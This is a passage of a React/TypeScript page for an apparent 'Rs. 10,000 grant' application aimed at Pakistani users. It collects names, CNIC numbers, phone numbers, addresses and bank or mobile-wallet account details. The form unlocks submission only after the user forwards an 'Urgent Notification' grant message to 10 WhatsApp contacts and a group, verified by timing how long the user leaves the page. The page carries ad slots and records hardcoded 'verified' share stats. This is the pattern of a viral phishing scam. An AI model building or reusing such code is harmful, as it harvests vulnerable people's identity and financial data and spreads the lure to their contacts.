import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import confetti from 'canvas-confetti';
import {
  User,
  CreditCard,
  Phone,
  MessageSquare,
  MapPin,
  CheckCircle2,
  AlertCircle,
  Send,
  Share2,
  Copy,
  Check,
  Search,
  Sparkles,
  ArrowRight,
  ShieldCheck,
  Lock,
  Users,
  Wallet,
  Building2,
  Smartphone,
  Award,
  Loader2,
  RefreshCw,
  ExternalLink,
  CheckSquare,
} from 'lucide-react';
import { Application, PaymentAccountInfo, ShareMeterStats } from '../types';
import { storageService } from '../services/storageService';
import { settingsService } from '../services/settingsService';
import { applicationService } from '../services/applicationService';
import { whatsappService } from '../services/whatsappService';
import { Button } from '../components/Button';
import { Input } from '../components/Input';
import { Textarea } from '../components/Textarea';
import { Checkbox } from '../components/Checkbox';
import { useLanguage } from '../context/LanguageContext';
import { AdSenseSlot } from '../components/AdSenseSlot';
import {
  isValidPhone,
  isValidPakistaniMobile,
  isValidCNIC,
  formatCNIC,
  formatMobileNumber,
  validateRequired,
} from '../utils/validation';

export const Apply: React.FC = () => {
  const navigate = useNavigate();
  const settings = settingsService.getProgramSettings();
  const waSettings = settingsService.getWhatsAppSettings();
  const { language, isUrdu, isEnglish, isDual, t } = useLanguage();

  // 1. Core 5 Clean Simple Fields
  const [fullName, setFullName] = useState('');
  const [nationalId, setNationalId] = useState('');
  const [phone, setPhone] = useState('');
  const [whatsappNumber, setWhatsappNumber] = useState('');
  const [address, setAddress] = useState('');

  // 2. Direct Rs. 10,000 Disbursement Account Details
  const [accountType, setAccountType] = useState('Easypaisa');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountTitle, setAccountTitle] = useState('');
  const [bankName, setBankName] = useState('');

  // 3. Share Counters (0 to 10 for contacts, 0 to 1 for group)
  const [contactsSharedCount, setContactsSharedCount] = useState<number>(0);
  const [isGroupShared, setIsGroupShared] = useState<boolean>(false);

  // Background Telemetry & Transit Verification Tracker
  const [isSharingActive, setIsSharingActive] = useState<boolean>(false);
  const [activeShareMode, setActiveShareMode] = useState<'contact' | 'group' | null>(null);
  const transitStartRef = useRef<number | null>(null);
  const transitAppSwitchedRef = useRef<boolean>(false);

  const [feedbackBanner, setFeedbackBanner] = useState<{
    type: 'success' | 'warning' | 'info';
    message: string;
  } | null>(null);

  const [declaredTruth, setDeclaredTruth] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submittedApp, setSubmittedApp] = useState<Application | null>(null);
  const [copiedId, setCopiedId] = useState(false);
  const [copiedMsg, setCopiedMsg] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});

  const targetContacts = waSettings.targetContactsCount || 10;
  const targetGroups = waSettings.targetGroupsCount || 1;
  const grantAmount = waSettings.grantAmountText || settings.grantAmountText || 'Rs. 10,000';

  // Load saved draft on mount
  useEffect(() => {
    try {
      const savedDraft = sessionStorage.getItem('citizengrant_10k_draft_v7');
      if (savedDraft) {
        const parsed = JSON.parse(savedDraft);
        if (parsed.fullName) setFullName(parsed.fullName);
        if (parsed.nationalId) setNationalId(parsed.nationalId);
        if (parsed.phone) setPhone(parsed.phone);
        if (parsed.whatsappNumber) setWhatsappNumber(parsed.whatsappNumber);
        if (parsed.address) setAddress(parsed.address);
        if (parsed.accountType) setAccountType(parsed.accountType);
        if (parsed.accountNumber) setAccountNumber(parsed.accountNumber);
        if (parsed.accountTitle) setAccountTitle(parsed.accountTitle);
        if (parsed.bankName) setBankName(parsed.bankName);
        if (typeof parsed.contactsSharedCount === 'number') {
          setContactsSharedCount(parsed.contactsSharedCount);
        }
        if (typeof parsed.isGroupShared === 'boolean') {
          setIsGroupShared(parsed.isGroupShared);
        }
      }
    } catch {
      // Ignore storage errors
    }
  }, []);

  // Save draft whenever state changes
  useEffect(() => {
    if (!submittedApp) {
      sessionStorage.setItem(
        'citizengrant_10k_draft_v7',
        JSON.stringify({
          fullName,
          nationalId,
          phone,
          whatsappNumber,
          address,
          accountType,
          accountNumber,
          accountTitle,
          bankName,
          contactsSharedCount,
          isGroupShared,
        })
      );
    }
  }, [
    fullName,
    nationalId,
    phone,
    whatsappNumber,
    address,
    accountType,
    accountNumber,
    accountTitle,
    bankName,
    contactsSharedCount,
    isGroupShared,
    submittedApp,
  ]);

  // Check if 5 core fields + account info are fully completed
  const areDetailsComplete = Boolean(
    fullName.trim() &&
      nationalId.trim() &&
      phone.trim() &&
      whatsappNumber.trim() &&
      address.trim() &&
      accountNumber.trim() &&
      accountTitle.trim()
  );

  // Exact Mathematical Meter Calculation:
  // - 0%: Initial state
  // - 50%: 5 core fields + account info completed
  // - 50% -> 90%: +4% per each verified contact share (10 contacts = +40%)
  // - 90% -> 100%: +10% when 1 group share is completed
  let meterPercentage = 0;
  if (areDetailsComplete) {
    meterPercentage = 50;
    const contactPoints = Math.min(targetContacts, contactsSharedCount) * 4;
    meterPercentage += contactPoints;

    if (isGroupShared && contactsSharedCount >= targetContacts) {
      meterPercentage = 100;
    } else if (isGroupShared) {
      meterPercentage = Math.min(99, meterPercentage + 10);
    }
  } else {
    const filledCount = [
      Boolean(fullName.trim()),
      Boolean(nationalId.trim()),
      Boolean(phone.trim()),
      Boolean(whatsappNumber.trim()),
      Boolean(address.trim()),
      Boolean(accountNumber.trim()),
      Boolean(accountTitle.trim()),
    ].filter(Boolean).length;
    meterPercentage = Math.round((filledCount / 7) * 45);
  }

  const isMeterComplete = meterPercentage >= 100;

  // Auto-fill account title with full name if empty
  const handleFullNameChange = (val: string) => {
    setFullName(val);
    if (!accountTitle || accountTitle === fullName) {
      setAccountTitle(val);
    }
    if (errors.fullName && val.trim().length >= 2) {
      setErrors((prev) => {
        const copy = { ...prev };
        delete copy.fullName;
        return copy;
      });
    }
  };

  // Handle CNIC input with auto-formatting
  const handleNationalIdChange = (val: string) => {
    const formatted = formatCNIC(val);
    setNationalId(formatted);
    if (errors.nationalId && isValidCNIC(formatted)) {
      setErrors((prev) => {
        const copy = { ...prev };
        delete copy.nationalId;
        return copy;
      });
    }
  };

  // Auto-fill WhatsApp number with phone if empty & format
  const handlePhoneChange = (val: string) => {
    const formatted = formatMobileNumber(val);
    setPhone(formatted);
    if (!whatsappNumber || whatsappNumber === phone) {
      setWhatsappNumber(formatted);
    }
    if (accountType === 'Easypaisa' || accountType === 'JazzCash') {
      if (!accountNumber || accountNumber === phone) {
        setAccountNumber(formatted);
      }
    }
    if (errors.phone && isValidPakistaniMobile(formatted)) {
      setErrors((prev) => {
        const copy = { ...prev };
        delete copy.phone;
        return copy;
      });
    }
  };

  const handleWhatsappNumberChange = (val: string) => {
    const formatted = formatMobileNumber(val);
    setWhatsappNumber(formatted);
    if (errors.whatsappNumber && isValidPakistaniMobile(formatted)) {
      setErrors((prev) => {
        const copy = { ...prev };
        delete copy.whatsappNumber;
        return copy;
      });
    }
  };

  // =========================================================================
  // INTELLIGENT TELEMETRY & TRANSIT VERIFICATION:
  // - User simply clicks "Share on WhatsApp" (Single clean button, zero UI confusion)
  // - App detects when the user actually switches to WhatsApp and spends genuine time (>= 4 seconds) to send
  // - If user just clicks and returns immediately in < 3.5s (fake attempt), it detects abandonment and refuses count!
  // - If genuine transit detected, it silently and automatically updates the meter by strictly +1.
  // =========================================================================
  useEffect(() => {
    const handleBlur = () => {
      // User has genuinely switched away from our app to WhatsApp
      if (transitStartRef.current) {
        transitAppSwitchedRef.current = true;
      }
    };

    const handleFocus = () => {
      if (transitStartRef.current && activeShareMode) {
        const timeAway = Date.now() - transitStartRef.current;
        const hasSwitchedApp = transitAppSwitchedRef.current;

        // Reset tracking refs
        const mode = activeShareMode;
        transitStartRef.current = null;
        transitAppSwitchedRef.current = false;
        setIsSharingActive(false);

        // Verification Rule: Must have switched away to WhatsApp AND spent at least 3.8 seconds
        if (hasSwitchedApp && timeAway >= 3800) {
          // Genuine message sending verified!
          if (mode === 'contact') {
            setContactsSharedCount((prev) => {
              const next = Math.min(targetContacts, prev + 1);
              if (next >= targetContacts && isGroupShared) {
                confetti({ particleCount: 80, spread: 70, origin: { y: 0.5 } });
              }
              return next;
            });

            setFeedbackBanner({
              type: 'success',
              message: `✅ واٹس ایپ میسج کی تصدیق ہو گئی! (+1 شامل ہوا، ${Math.min(
                targetContacts,
                contactsSharedCount + 1
              )}/10 مکمل)`,
            });
          } else if (mode === 'group') {
            setIsGroupShared(true);
            if (contactsSharedCount >= targetContacts) {
              confetti({ particleCount: 100, spread: 80, origin: { y: 0.5 } });
            }
            setFeedbackBanner({
              type: 'success',
              message: '✅ واٹس ایپ گروپ شیئرنگ کی تصدیق مکمل! میٹر 100% ہو گیا اور سبمٹ بٹن فعال ہو گیا ہے۔',
            });
          }

          setErrors((prev) => {
            const copy = { ...prev };
            delete copy.contacts;
            delete copy.groups;
            return copy;
          });
        } else {
          // User returned too fast or didn't switch to WhatsApp -> Fake / Abandoned share detected!
          setFeedbackBanner({
            type: 'warning',
            message: '⚠️ واٹس ایپ میں میسج سینڈ نہیں ہوا۔ براہ کرم واٹس ایپ پر جا کر میسج بھیجیں تاکہ کاؤنٹ شامل ہو۔',
          });
        }
      }
    };

    window.addEventListener('blur', handleBlur);
    window.addEventListener('focus', handleFocus);

    return () => {
      window.removeEventListener('blur', handleBlur);
      window.removeEventListener('focus', handleFocus);
    };
  }, [activeShareMode, contactsSharedCount, isGroupShared]);

  // Single-Click Share Action for Contacts (Zero UI Confusion)
  const handleShareContact = () => {
    if (!areDetailsComplete) {
      setErrors({
        form: 'براہ کرم پہلے اوپر دی گئی 5 معلومات اور اپنا اکاؤنٹ نمبر درج کریں (50% مکمل کریں)۔',
      });
      window.scrollTo({ top: 160, behavior: 'smooth' });
      return;
    }

    setErrors((prev) => {
      const copy = { ...prev };
      delete copy.contacts;
      delete copy.form;
      return copy;
    });

    // Start Telemetry Tracking
    transitStartRef.current = Date.now();
    transitAppSwitchedRef.current = false;
    setActiveShareMode('contact');
    setIsSharingActive(true);

    setFeedbackBanner({
      type: 'info',
      message: `📲 واٹس ایپ کھل رہا ہے۔ دوست #${contactsSharedCount + 1} کو میسج سینڈ کر کے واپس آئیں۔`,
    });

    // Open WhatsApp
    whatsappService.executeShare({
      placement: 'pre_submission_criteria',
      customMessage: waSettings.shareMessageTemplate,
      targetUrl: `${window.location.origin}/apply`,
    });
  };

  // Single-Click Share Action for Group
  const handleShareGroup = () => {
    if (!areDetailsComplete) {
      setErrors({
        form: 'براہ کرم پہلے اوپر دی گئی 5 معلومات اور اپنا اکاؤنٹ نمبر درج کریں (50% مکمل کریں)۔',
      });
      window.scrollTo({ top: 160, behavior: 'smooth' });
      return;
    }

    if (contactsSharedCount < targetContacts) {
      setErrors({
        contacts: `براہ کرم پہلے 10 دوستوں کو میسج سینڈ کریں (${contactsSharedCount}/10 مکمل)`,
      });
      return;
    }

    setErrors((prev) => {
      const copy = { ...prev };
      delete copy.groups;
      return copy;
    });

    // Start Telemetry Tracking
    transitStartRef.current = Date.now();
    transitAppSwitchedRef.current = false;
    setActiveShareMode('group');
    setIsSharingActive(true);

    setFeedbackBanner({
      type: 'info',
      message: '📲 واٹس ایپ گروپ سلیکٹر کھل رہا ہے۔ کسی بھی 1 گروپ میں میسج بھیج کر واپس آئیں۔',
    });

    const groupMsg =
      waSettings.groupShareMessageTemplate ||
      `📢 Urgent Notification: Direct ${grantAmount} Financial Grant by ${settings.orgName}. Apply online now with your CNIC and account details: {URL}`;

    whatsappService.executeShare({
      placement: 'pre_submission_criteria',
      customMessage: groupMsg,
      targetUrl: `${window.location.origin}/apply`,
    });
  };

  const handleCopyMessage = () => {
    const msg = whatsappService.formatShareMessage(waSettings.shareMessageTemplate, {
      url: `${window.location.origin}/apply`,
    });
    navigator.clipboard.writeText(msg);
    setCopiedMsg(true);
    setTimeout(() => setCopiedMsg(false), 3000);
  };

  const handleResetDraft = () => {
    if (window.confirm('کیا آپ تمام درج کردہ معلومات اور واٹس ایپ شیئرز دوبارہ شروع (Reset) کرنا چاہتے ہیں؟')) {
      sessionStorage.removeItem('citizengrant_10k_draft_v7');
      setFullName('');
      setNationalId('');
      setPhone('');
      setWhatsappNumber('');
      setAddress('');
      setAccountNumber('');
      setAccountTitle('');
      setBankName('');
      setContactsSharedCount(0);
      setIsGroupShared(false);
      transitStartRef.current = null;
      transitAppSwitchedRef.current = false;
      setIsSharingActive(false);
      setActiveShareMode(null);
      setFeedbackBanner(null);
      setErrors({});
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Record<string, string> = {};

    if (!validateRequired(fullName) || fullName.trim().length < 2) {
      newErrors.fullName = 'پورا نام درج کریں (Full Name is required)';
    }

    if (!validateRequired(nationalId)) {
      newErrors.nationalId = 'شناختی کارڈ نمبر درج کریں (CNIC is required)';
    } else if (!isValidCNIC(nationalId)) {
      newErrors.nationalId = 'درست 13 ہندسوں کا قومی شناختی کارڈ نمبر درج کریں (مثلاً 42101-1234567-8)';
    }

    if (!validateRequired(phone)) {
      newErrors.phone = 'موبائل فون نمبر درج کریں (Phone is required)';
    } else if (!isValidPakistaniMobile(phone)) {
      newErrors.phone = 'درست 11 ہندسوں کا موبائل فون نمبر درج کریں (مثلاً 0300-1234567)';
    }

    if (!validateRequired(whatsappNumber)) {
      newErrors.whatsappNumber = 'واٹس ایپ نمبر درج کریں (WhatsApp is required)';
    } else if (!isValidPakistaniMobile(whatsappNumber)) {
      newErrors.whatsappNumber = 'درست 11 ہندسوں کا واٹس ایپ نمبر درج کریں (مثلاً 0300-1234567)';
    }

    if (!validateRequired(address) || address.trim().length < 3) {
      newErrors.address = 'مکمل پتہ اور شہر درج کریں (Address is required)';
    }

    if (!validateRequired(accountNumber)) {
      newErrors.accountNumber = 'اکاؤنٹ نمبر یا موبائل والیٹ نمبر درج کریں';
    }

    if (!validateRequired(accountTitle)) {
      newErrors.accountTitle = 'اکاؤنٹ ہولڈر کا نام درج کریں';
    }

    if (contactsSharedCount < targetContacts) {
      newErrors.contacts = `براہ کرم تمام 10 دوستوں کو میسج سینڈ کریں (${contactsSharedCount}/${targetContacts} مکمل)`;
    }

    if (!isGroupShared) {
      newErrors.groups = `میٹر 100% کرنے کے لیے کم از کم 1 واٹس ایپ گروپ میں میسج شیئر کریں`;
    }

    if (!declaredTruth) {
      newErrors.declaration = 'براہ کرم اقرار نامے کے خانے کو چیک کریں۔';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateForm()) {
      window.scrollTo({ top: 180, behavior: 'smooth' });
      return;
    }

    setIsSubmitting(true);

    try {
      await new Promise((resolve) => setTimeout(resolve, 600));

      const paymentInfo: PaymentAccountInfo = {
        accountType,
        accountNumber: accountNumber.trim(),
        accountTitle: accountTitle.trim(),
        bankName: accountType === 'Bank Account' ? bankName.trim() : undefined,
      };

      const shareStats: ShareMeterStats = {
        contactsSharedCount: 10,
        groupsSharedCount: 1,
        meterPercentage: 100,
        isFullyQualified: true,
      };

      const app = applicationService.submitApplication({
        personalInfo: {
          fullName: fullName.trim(),
          nationalId: nationalId.trim(),
          phone: phone.trim(),
          whatsappNumber: whatsappNumber.trim(),
          email: `${fullName.toLowerCase().replace(/\s+/g, '')}@citizengrantportal.org`,
        },
        addressInfo: {
          address: address.trim(),
          city: address.split(',').pop()?.trim() || address.trim(),
        },
        householdInfo: {
          familyMembers: 1,
          dependents: 0,
          employmentStatus: `Direct ${grantAmount} Citizen Support Scheme`,
          monthlyIncome: 0,
          housingStatus: 'Residential',
        },
        reasonForApplication: `Direct ${grantAmount} Grant Package - Account: ${accountType} (${accountNumber})`,
        customFields: {
          accountType,
          accountNumber,
          accountTitle,
          bankName: bankName || 'N/A',
          shareMeterScore: `100% Verified (10 WhatsApp Contacts & 1 Group Shared)`,
        },
        whatsappVerifiedBeforeSubmit: true,
      });

      storageService.updateApplication(app.applicationId, {
        paymentAccount: paymentInfo,
        shareMeter: shareStats,
      });

      const fullUpdated = storageService.getApplication(app.applicationId);
      setSubmittedApp(fullUpdated || app);
      sessionStorage.removeItem('citizengrant_10k_draft_v7');

      confetti({
        particleCount: 120,
        spread: 80,
        origin: { y: 0.6 },
      });

      window.scrollTo({ top: 0, behavior: 'smooth' });
    } catch (err) {
      console.error(err);
      setErrors({ form: 'درخواست جمع کرنے کے دوران مسئلہ پیش آیا۔ براہ کرم دوبارہ کوشش کریں۔' });
    } finally {
      setIsSubmitting(false);
    }
  };

  const copyAppId = () => {
    if (submittedApp) {
      navigator.clipboard.writeText(submittedApp.applicationId);
      setCopiedId(true);
      setTimeout(() => setCopiedId(false), 3000);
    }
  };

  // =========================================================================
  // VIEW 1: SUBMISSION SUCCESS SCREEN
  // =========================================================================
  if (submittedApp) {
    return (
      <div className="container-narrow" style={{ padding: '1.5rem 0.75rem' }}>
        <div
          className="card responsive-card"
          style={{
            textAlign: 'center',
            boxShadow: 'var(--shadow-md)',
            border: '1.5px solid var(--primary-300)',
          }}
        >
          <div
            style={{
              width: '54px',
              height: '54px',
              borderRadius: '50%',
              backgroundColor: 'var(--primary-100)',
              color: 'var(--primary-700)',
              display: 'inline-flex',
              alignItems: 'center',
              justifyContent: 'center',
              marginBottom: '0.75rem',
            }}
          >
            <CheckCircle2 size={32} strokeWidth={2.2} />
          </div>

          <div
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '0.3rem',
              backgroundColor: '#ecfdf5',
              color: '#065f46',
              padding: '0.2rem 0.65rem',
              borderRadius: 'var(--radius-full)',
              fontSize: '0.75rem',
              fontWeight: 800,
              marginBottom: '0.5rem',
              border: '1px solid #a7f3d0',
            }}
          >
            <Sparkles size={13} /> Direct {grantAmount} Application Logged
          </div>

          <h2 style={{ fontSize: '1.35rem', fontWeight: 800, color: 'var(--navy-900)', marginBottom: '0.35rem' }}>
            درخواست کامیابی سے موصول ہوگئی!
          </h2>

          <p
            style={{
              fontSize: '0.85rem',
              color: 'var(--text-muted)',
              maxWidth: '480px',
              margin: '0 auto 1.25rem',
              lineHeight: '1.5',
            }}
          >
            اہلیت کی تصدیق کے بعد <strong>{grantAmount}</strong> کی رقم براہ راست آپ کے فراہم کردہ اکاؤنٹ میں منتقل کر دی جائے گی۔
          </p>

          {/* Reference ID Banner */}
          <div
            style={{
              backgroundColor: 'var(--primary-50)',
              border: '1.5px dashed var(--primary-600)',
              borderRadius: '10px',
              padding: '1rem',
              maxWidth: '400px',
              margin: '0 auto 1.25rem',
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              gap: '0.35rem',
            }}
          >
            <span
              style={{
                fontSize: '0.72rem',
                textTransform: 'uppercase',
                letterSpacing: '0.05em',
                color: 'var(--primary-800)',
                fontWeight: 700,
              }}
            >
              Application Reference ID (درخواست نمبر)
            </span>
            <div
              style={{
                fontFamily: 'var(--font-mono)',
                fontSize: '1.45rem',
                fontWeight: 800,
                color: 'var(--primary-900)',
                letterSpacing: '0.03em',
              }}
            >
              {submittedApp.applicationId}
            </div>
            <Button
              variant="secondary"
              size="sm"
              onClick={copyAppId}
              icon={copiedId ? <Check size={14} color="var(--primary-600)" /> : <Copy size={14} />}
            >
              {copiedId ? 'Copied! (کاپی ہوگیا)' : 'Copy Reference ID'}
            </Button>
          </div>

          {/* Account & Share Summary Card */}
          <div
            style={{
              backgroundColor: 'var(--surface-subtle)',
              border: '1px solid var(--border)',
              borderRadius: '8px',
              padding: '1rem',
              textAlign: 'left',
              maxWidth: '400px',
              margin: '0 auto 1.5rem',
              fontSize: '0.8125rem',
              display: 'flex',
              flexDirection: 'column',
              gap: '0.4rem',
            }}
          >
            <div
              style={{
                fontWeight: 700,
                color: 'var(--navy-900)',
                borderBottom: '1px solid var(--border)',
                paddingBottom: '0.25rem',
              }}
            >
              Disbursement Summary
            </div>
            <div>
              <strong>Applicant:</strong> {submittedApp.personalInfo?.fullName} (CNIC: {submittedApp.personalInfo?.nationalId})
            </div>
            <div>
              <strong>Target Account:</strong> {submittedApp.paymentAccount?.accountType || accountType} - {submittedApp.paymentAccount?.accountNumber || accountNumber}
            </div>
            <div>
              <strong>Account Title:</strong> {submittedApp.paymentAccount?.accountTitle || accountTitle}
            </div>
            <div style={{ color: 'var(--whatsapp-dark)', fontWeight: 700 }}>
              ✓ WhatsApp Outreach: 100% Verified (10 Contacts + 1 Group)
            </div>
          </div>

          {/* Action Buttons */}
          <div style={{ display: 'flex', flexWrap: 'wrap', justifyContent: 'center', gap: '0.5rem' }}>
            <Link
              to={`/application-status?id=${encodeURIComponent(submittedApp.applicationId)}`}
              className="btn btn-primary"
            >
              <Search size={15} />
              <span>Track Application Status</span>
            </Link>

            <Link to="/" className="btn btn-secondary">
              Return to Home
            </Link>
          </div>
        </div>
      </div>
    );
  }

  // =========================================================================
  // VIEW 2: APPLICATION FORM (SUPER CLEAN 1-BUTTON INTERFACE)
  // =========================================================================
  return (
    <div style={{ backgroundColor: 'var(--navy-50)', minHeight: 'calc(100vh - 56px)', padding: '1.25rem 0 2.5rem' }}>
      <div className="container-narrow">
        {/* Top Header Card */}
        <div style={{ marginBottom: '1rem', textAlign: 'center' }}>
          <div
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '0.35rem',
              backgroundColor: '#dcfce7',
              color: '#065f46',
              padding: '0.2rem 0.65rem',
              borderRadius: 'var(--radius-full)',
              fontSize: '0.72rem',
              fontWeight: 800,
              marginBottom: '0.4rem',
              border: '1px solid #86efac',
            }}
          >
            <Award size={13} />
            <span>Direct {grantAmount} Grant Program 2026</span>
          </div>

          <h1 className="page-title" style={{ fontWeight: 800, color: 'var(--navy-900)', marginBottom: '0.25rem' }}>
            {isUrdu ? '10,000 روپے کیش گرانٹ درخواست' : `Direct ${grantAmount} Grant Application`}
          </h1>
          <p className="page-subtitle" style={{ color: 'var(--navy-600)', maxWidth: '540px', margin: '0 auto' }}>
            {isUrdu
              ? 'معلومات اور اکاؤنٹ درج کریں (50%)، پھر واٹس ایپ پر 10 دوستوں (90%) اور 1 گروپ میں شیئر کر کے میٹر 100% مکمل کریں۔'
              : 'Complete your details (50%), then share with 10 contacts (90%) and 1 group on WhatsApp to complete 100%.'}
          </p>
        </div>

        {/* AdSense Top Banner */}
        <AdSenseSlot format="horizontal" />

        {/* =========================================================================
            DYNAMIC INTERACTIVE ELIGIBILITY & SHARE METER BAR (0% -> 50% -> 90% -> 100%)
            ========================================================================= */}
        <div
          className="card responsive-card"
          style={{
            marginBottom: '1rem',
            backgroundColor: '#ffffff',
            border: isMeterComplete ? '1.5px solid #25D366' : '1px solid var(--border)',
            boxShadow: isMeterComplete ? '0 4px 15px -3px rgba(37, 211, 102, 0.25)' : 'var(--shadow-xs)',
          }}
        >
          {/* Meter Top Header */}
          <div
            style={{
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              marginBottom: '0.4rem',
              gap: '0.4rem',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              <div
                style={{
                  width: '30px',
                  height: '30px',
                  borderRadius: '50%',
                  backgroundColor: isMeterComplete
                    ? '#25D366'
                    : meterPercentage >= 50
                    ? '#0284c7'
                    : 'var(--navy-200)',
                  color: '#ffffff',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontWeight: 800,
                  fontSize: '0.75rem',
                  flexShrink: 0,
                }}
              >
                {isMeterComplete ? <Check size={16} strokeWidth={3} /> : `${meterPercentage}%`}
              </div>
              <div>
                <span style={{ fontSize: '0.875rem', fontWeight: 800, color: 'var(--navy-900)' }}>
                  {isUrdu ? 'اہلیت و واٹس ایپ شیئرنگ میٹر' : 'Eligibility & WhatsApp Share Meter'}
                </span>
                <div style={{ fontSize: '0.72rem', color: 'var(--navy-600)' }}>
                  {isMeterComplete
                    ? '🎉 100% مکمل! نیچے بٹن سے درخواست جمع کروائیں۔'
                    : meterPercentage >= 90
                    ? '90% مکمل - 1 واٹس ایپ گروپ میں شیئر کر کے 100% حاصل کریں'
                    : meterPercentage >= 50
                    ? `50% مکمل - واٹس ایپ پر میسج بھیجیں (${contactsSharedCount}/10)`
                    : 'پہلے نیچے دی گئی معلومات اور اکاؤنٹ درج کریں (50%)'}
                </div>
              </div>
            </div>

            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', flexShrink: 0 }}>
              <button
                type="button"
                onClick={handleResetDraft}
                title="Reset Form"
                style={{
                  background: 'none',
                  border: 'none',
                  color: 'var(--navy-400)',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '0.2rem',
                  fontSize: '0.7rem',
                }}
              >
                <RefreshCw size={10} /> Reset
              </button>

              <span
                style={{
                  fontFamily: 'var(--font-mono)',
                  fontSize: '1.15rem',
                  fontWeight: 800,
                  color: isMeterComplete ? '#15803d' : meterPercentage >= 50 ? '#0369a1' : 'var(--navy-700)',
                }}
              >
                {meterPercentage}%
              </span>
            </div>
          </div>

          {/* Visual Progress Bar Track */}
          <div
            style={{
              width: '100%',
              backgroundColor: 'var(--navy-100)',
              borderRadius: 'var(--radius-full)',
              height: '8px',
              overflow: 'hidden',
              margin: '0.35rem 0',
              border: '1px solid var(--navy-200)',
            }}
          >
            <div
              style={{
                height: '100%',
                width: `${meterPercentage}%`,
                background: isMeterComplete
                  ? 'linear-gradient(90deg, #10b981 0%, #25D366 100%)'
                  : meterPercentage >= 90
                  ? 'linear-gradient(90deg, #0284c7 0%, #10b981 100%)'
                  : 'linear-gradient(90deg, #3b82f6 0%, #0ea5e9 100%)',
                borderRadius: 'var(--radius-full)',
                transition: 'width 400ms ease',
              }}
            />
          </div>

          {/* 4 Milestones Indicators Grid - Clean & Responsive */}
          <div
            className="milestones-grid"
            style={{
              marginTop: '0.35rem',
              fontSize: '0.7rem',
              textAlign: 'center',
            }}
          >
            <div style={{ color: 'var(--navy-600)', fontWeight: 600, padding: '0.2rem', backgroundColor: 'var(--navy-50)', borderRadius: '4px' }}>
              <div style={{ fontWeight: 800, color: 'var(--navy-900)' }}>0%</div>
              <span>Start</span>
            </div>

            <div style={{ color: areDetailsComplete ? 'var(--primary-700)' : 'var(--navy-500)', fontWeight: 600, padding: '0.2rem', backgroundColor: areDetailsComplete ? '#f0fdf4' : 'var(--navy-50)', borderRadius: '4px' }}>
              <div style={{ fontWeight: 800, color: areDetailsComplete ? '#15803d' : 'var(--navy-700)' }}>
                {areDetailsComplete ? '✓ 50%' : '50%'}
              </div>
              <span>Details</span>
            </div>

            <div
              style={{
                color: contactsSharedCount >= targetContacts ? 'var(--primary-700)' : 'var(--navy-500)',
                fontWeight: 600,
                padding: '0.2rem',
                backgroundColor: contactsSharedCount >= targetContacts ? '#f0fdf4' : 'var(--navy-50)',
                borderRadius: '4px',
              }}
            >
              <div
                style={{
                  fontWeight: 800,
                  color: contactsSharedCount >= targetContacts ? '#15803d' : 'var(--navy-700)',
                }}
              >
                {contactsSharedCount >= targetContacts ? '✓ 90%' : `${50 + contactsSharedCount * 4}%`}
              </div>
              <span>10 Friends ({contactsSharedCount}/10)</span>
            </div>

            <div style={{ color: isMeterComplete ? 'var(--primary-700)' : 'var(--navy-500)', fontWeight: 600, padding: '0.2rem', backgroundColor: isMeterComplete ? '#f0fdf4' : 'var(--navy-50)', borderRadius: '4px' }}>
              <div style={{ fontWeight: 800, color: isMeterComplete ? '#15803d' : 'var(--navy-700)' }}>
                {isMeterComplete ? '✓ 100%' : '100%'}
              </div>
              <span>1 Group ({isGroupShared ? 1 : 0}/1)</span>
            </div>
          </div>
        </div>

        {/* Live Feedback Notification Banner */}
        {feedbackBanner && (
          <div
            className={`alert ${
              feedbackBanner.type === 'success'
                ? 'alert-success'
                : feedbackBanner.type === 'warning'
                ? 'alert-warning'
                : 'alert-info'
            }`}
            style={{
              marginBottom: '1.5rem',
              display: 'flex',
              alignItems: 'center',
              gap: '0.75rem',
              animation: 'fadeIn 200ms ease',
            }}
          >
            {isSharingActive ? (
              <Loader2 size={20} className="loading-spinner" style={{ borderTopColor: 'currentColor' }} />
            ) : feedbackBanner.type === 'success' ? (
              <CheckCircle2 size={20} color="#059669" />
            ) : (
              <AlertCircle size={20} />
            )}
            <span style={{ fontSize: '0.875rem', fontWeight: 600, lineHeight: '1.4' }}>
              {feedbackBanner.message}
            </span>
          </div>
        )}

        {/* Main Application Form Container */}
        <div className="card responsive-card" style={{ boxShadow: 'var(--shadow-sm)' }}>
          {errors.form && (
            <div className="alert alert-danger" style={{ marginBottom: '1.5rem' }}>
              <AlertCircle size={20} className="alert-icon" />
              <div className="alert-content">{errors.form}</div>
            </div>
          )}

          <form onSubmit={handleSubmit}>
            {/* =========================================================================
                SECTION 1: APPLICANT BASIC 5 FIELDS
                ========================================================================= */}
            <div style={{ borderBottom: '2px solid var(--navy-100)', paddingBottom: '1.75rem', marginBottom: '2rem' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '1.25rem' }}>
                <div
                  style={{
                    padding: '0.5rem',
                    backgroundColor: 'var(--primary-50)',
                    color: 'var(--primary-700)',
                    borderRadius: 'var(--radius-md)',
                  }}
                >
                  <User size={22} />
                </div>
                <div>
                  <h3 style={{ fontSize: '1.2rem', fontWeight: 800, color: 'var(--navy-900)' }}>
                    1. Applicant Personal Details (درخواست گزار کی 5 بنیادی معلومات)
                  </h3>
                  <p style={{ fontSize: '0.8125rem', color: 'var(--text-muted)' }}>
                    صرف 5 آسان معلومات درج کریں تاکہ میٹر <strong>50%</strong> ہو سکے
                  </p>
                </div>
              </div>

              {/* 1. Full Name */}
              <Input
                label="1. Full Name (پورا نام)"
                placeholder="e.g. Muhammad Tariq / Sarah Khan"
                value={fullName}
                onChange={(e) => handleFullNameChange(e.target.value)}
                error={errors.fullName}
